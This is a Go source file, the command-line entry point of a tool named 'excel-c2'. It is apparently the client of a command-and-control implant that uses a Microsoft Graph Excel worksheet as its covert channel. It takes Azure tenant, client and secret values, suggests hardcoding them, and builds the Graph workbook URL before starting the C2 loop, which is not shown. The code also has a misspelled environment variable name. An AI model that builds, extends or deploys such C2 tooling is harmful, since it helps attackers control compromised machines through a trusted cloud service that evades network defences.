package cmd

import (
	"net/http"
	"os"

	"Excel-C2/internal/C2"

	"github.com/spf13/cobra"
)

var (
	tenantId     string
	clientId     string
	clientSecret string
	driveId      string
	sheetId      string
	debug        bool = true
)

var rootCmd = &cobra.Command{
	Use:   "excel-c2",
	Short: "excel-c2",
	Long:  `excel-c2`,

	Run: func(cmd *cobra.Command, args []string) {
		c2 := new(C2.Client)

		//Azure fields
		c2.TenantId = tenantId
		c2.ClientId = clientId
		c2.ClientSecret = clientSecret
		c2.DriveId = driveId
		c2.SheetId = sheetId

		//HTTP Fields
		c2.UserAgent = "GoLang Client"
		c2.HttpClient = new(http.Client)
		c2.BaseURL = "https://graph.microsoft.com/v1.0/drives/" + c2.DriveId + "/items/" + c2.SheetId + "/workbook/worksheets"

		//Start
		C2.Run(c2)
	},
}

func init() {
	rootCmd.Flags().StringVarP(&tenantId, "tenant", "t", os.Getenv("TENANT_ID"), "Azure tenant ID")
	rootCmd.MarkFlagRequired("tenant") // Comment to hardcode

	rootCmd.Flags().StringVarP(&clientId, "client", "c", os.Getenv("CLIET_ID"), "Azure client ID")
	rootCmd.MarkFlagRequired("client") // Comment to hardcode

	rootCmd.Flags().StringVarP(&clientSecret, "secret", "s", os.Getenv("CLIENT_SECRET"), "Azure client secret")
	rootCmd.MarkFlagRequired("secret") // Comment to hardcode

	rootCmd.Flags().StringVarP(&driveId, "drive", "d", os.Getenv("DRIVE_ID"), "Azure drive ID")
	rootCmd.MarkFlagRequired("drive") // Comment to hardcode

	rootCmd.Flags().StringVarP(&sheetId, "sheet", "e", os.Getenv("SHEET_ID"), "Azure sheet ID")
	rootCmd.MarkFlagRequired("sheet") // Comment to hardcode

	rootCmd.Flags().BoolVarP(&debug, "verbos", "v", false, "Enable verbos output")

}

func Execute() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
